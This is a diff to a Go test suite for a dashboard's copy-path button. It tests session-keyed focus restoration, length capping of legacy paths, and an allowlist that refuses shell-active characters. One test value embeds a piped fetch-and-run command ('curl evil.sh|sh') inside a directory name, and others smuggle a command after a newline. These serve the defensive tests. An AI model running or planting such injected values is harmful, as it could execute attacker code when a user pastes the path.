@@ -230,6 +230,20 @@ func TestHandleDashboard_ClusterSuffixComposesWithCopyButton(t *testing.T) {
 	if !strings.Contains(body, `class="copycwd"`) {
 		t.Errorf("grouped row lost its copy button:\n%s", body)
 	}
+	// The poller carries keyboard focus across its #content swap by matching the
+	// button's data-session, so a cluster — two sessions, one identical cwd — is
+	// exactly where a data-cwd key would land focus on the wrong row. The two
+	// buttons must therefore carry DISTINCT session keys, and row order inside a
+	// cluster is not stable between polls, so this is the only thing that keeps
+	// focus on the row the user was actually on.
+	keys := regexp.MustCompile(`data-session="([^"]*)"`).FindAllStringSubmatch(body, -1)
+	if len(keys) != 2 {
+		t.Fatalf("expected both clustered buttons to carry data-session, got %d, in:\n%s", len(keys), body)
+	}
+	if keys[0][1] == keys[1][1] || keys[0][1] == "" {
+		t.Errorf("clustered rows must carry distinct non-empty session keys, got %q and %q",
+			keys[0][1], keys[1][1])
+	}
 }
 
 // The mirror image: a grouped row with NO cwd has no button to carry the note, so
@@ -304,8 +318,8 @@ func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
 // bypassing buildEvent — is the point: it is the only way to produce the legacy
 // shape, and the only thing that distinguishes this from the test above. All
 // three attributes the cwd reaches are checked, not just the copy target: the
-// client's clean() defends the clipboard alone, so title and aria-label have no
-// second line of defence.
+// client's copy guard defends the clipboard alone, so title and aria-label have
+// no second line of defence.
 func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
 	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
 	defer db.Close()
@@ -333,6 +347,35 @@ func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
 		if !strings.Contains(m[1], "/home/me/wtcurl evil.sh|sh") {
 			t.Errorf("%s = %q, want the cwd with only its control characters removed", attr, m[1])
 		}
+	}
+}
+
+// The read path re-applies the length cap as well as the control-character
+// strip. Both exist for the same rows — written before cwd had either — and an
+// oversized one would otherwise be rendered three times per roster row on every
+// render and every poll. Inserted directly, bypassing buildEvent, which is the
+// only way to produce the legacy shape.
+func TestHandleDashboard_LegacyOversizedCwdIsCappedOnRead(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	long := "/home/me/" + strings.Repeat("a", maxPathLen)
+	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: long,
+		SessionID: "sess-long", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
+		t.Fatal(err)
+	}
+
+	body := getBody(t, db, "/")
+	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
+	if m == nil {
+		t.Fatalf("expected a copy button to render:\n%s", body)
+	}
+	if n := len([]rune(m[1])); n != maxPathLen+1 { // +1 for the ellipsis truncate appends
+		t.Errorf("data-cwd is %d runes, want the %d-rune cap plus an ellipsis", n, maxPathLen)
+	}
+	// ...and the ellipsis is what makes the client's 'truncated' refusal fire.
+	if !strings.HasSuffix(m[1], "…") {
+		t.Errorf("capped cwd should end in an ellipsis, got %q", m[1][len(m[1])-8:])
 	}
 }
 
@@ -372,7 +415,8 @@ func TestHandleDashboard_RedactedCwdIsRefusedByTheCopyGuard(t *testing.T) {
 		`if (s.indexOf('` + redacted + `') !== -1) return 'redacted';`,
 		`if (s.charAt(s.length - 1) === '…') return 'truncated';`,
 		`if (pathAllow.test(s)) return 'unsafe';`,
-		`var why = unusableReason(path);`,
+		`var path = btn.getAttribute('data-cwd') || '';`,
+		`var why = ctrlChars.test(path) ? 'unsafe' : unusableReason(path);`,
 		`flash(btn, false, unusableMsg[why]);`,
 		`redacted: 'part of this path was redacted — not copied',`,
 		`truncated: 'this path was too long and got cut off — not copied',`,
@@ -394,6 +438,16 @@ const pathAllowJS = `[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]`
 
 var pathAllowGo = regexp.MustCompile(strings.ReplaceAll(pathAllowJS, `\\`, `\`))
 
+// The same, for the ES5 fallback the guard installs on an engine without
+// Unicode property escapes. It is pinned because it is the pattern those older
+// engines actually run: widening this class to quiet a false positive would
+// break the refusal on exactly the engines the fallback exists for, and nothing
+// else in the suite would notice. Only the \uXXXX escapes need translating.
+const pathAllowFallbackJS = `[^-A-Za-z0-9 /._+=,:@~%\\u0080-\\uFFFF]`
+
+var pathAllowFallbackGo = regexp.MustCompile(strings.NewReplacer(
+	`\\u0080`, `\x{0080}`, `\\uFFFF`, `\x{FFFF}`).Replace(pathAllowFallbackJS))
+
 // The allowlist has to refuse everything a shell would act on, and it has to
 // stay out of the way of ordinary paths. The second half matters as much as the
 // first: refusing spaces or non-ASCII names would make the button useless on a
@@ -408,10 +462,18 @@ func TestDashboardCopyGuard_PathAllowlist(t *testing.T) {
 		"/home/me/v1.2+build=3,rev:4@host~tmp/100%_done-ok", // every permitted punctuation mark
 		"/",
 	}
-	for _, p := range safe {
-		if pathAllowGo.MatchString(p) {
-			t.Errorf("allowlist refuses an ordinary path: %q (offending char %q)",
-				p, pathAllowGo.FindString(p))
+	// Both patterns, always: the fallback is what pre-2018 engines run, and a
+	// divergence between the two is a hole that only opens on those engines.
+	pats := map[string]*regexp.Regexp{
+		"unicode property escapes": pathAllowGo,
+		"ES5 fallback":             pathAllowFallbackGo,
+	}
+	for which, re := range pats {
+		for _, p := range safe {
+			if re.MatchString(p) {
+				t.Errorf("%s allowlist refuses an ordinary path: %q (offending char %q)",
+					which, p, re.FindString(p))
+			}
 		}
 	}
 
@@ -434,9 +496,11 @@ func TestDashboardCopyGuard_PathAllowlist(t *testing.T) {
 		"comment hash":         "/home/me/proj#x",
 		"newline":              "/home/me/proj\nid",
 	}
-	for name, p := range unsafe {
-		if !pathAllowGo.MatchString(p) {
-			t.Errorf("allowlist permits a shell-active path (%s): %q", name, p)
+	for which, re := range pats {
+		for name, p := range unsafe {
+			if !re.MatchString(p) {
+				t.Errorf("%s allowlist permits a shell-active path (%s): %q", which, name, p)
+			}
 		}
 	}
 }
@@ -449,6 +513,9 @@ func TestHandleDashboard_ShipsThePathAllowlist(t *testing.T) {
 	if !strings.Contains(body, `new RegExp('`+pathAllowJS+`', 'u')`) {
 		t.Errorf("the page does not ship the allowlist this suite tests: %s", pathAllowJS)
 	}
+	if !strings.Contains(body, `new RegExp('`+pathAllowFallbackJS+`')`) {
+		t.Errorf("the page does not ship the fallback allowlist this suite tests: %s", pathAllowFallbackJS)
+	}
 }
 
 // Two ways the copy button can fail a keyboard user, both of which cost nothing
@@ -456,7 +523,10 @@ func TestHandleDashboard_ShipsThePathAllowlist(t *testing.T) {
 // (Enter does not collapse a selection made earlier elsewhere, so a
 // document-wide guard would swallow the copy with no flash and no
 // announcement), and the poller must carry focus across its #content swap
-// rather than drop it to <body> mid-interaction.
+// rather than drop it to <body> mid-interaction. The refocus key is the session
+// id (a cluster shares one cwd, so a path key would restore to the wrong row)
+// and the focus call must pass preventScroll (rows move between polls, and
+// refocusing must not yank a viewport the user did not scroll).
 func TestHandleDashboard_CopyButtonSurvivesKeyboardUseAndRefresh(t *testing.T) {
 	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
 	defer db.Close()
@@ -466,7 +536,8 @@ func TestHandleDashboard_CopyButtonSurvivesKeyboardUseAndRefresh(t *testing.T) {
 		`sel.containsNode(btn, true)`,
 		`function swapContent(html) {`,
 		`active.closest('#content .copycwd')`,
-		`if (btns[i].getAttribute('data-cwd') === key) { btns[i].focus(); return; }`,
+		`var key = keep ? keep.getAttribute('data-session') : null;`,
+		`if (btns[i].getAttribute('data-session') === key) { btns[i].focus({ preventScroll: true }); return; }`,
 		`document.dispatchEvent(new CustomEvent('ch:contentswap'))`,
 		`document.addEventListener('ch:contentswap', unflash);`,
 		`swapContent(d.html);`,
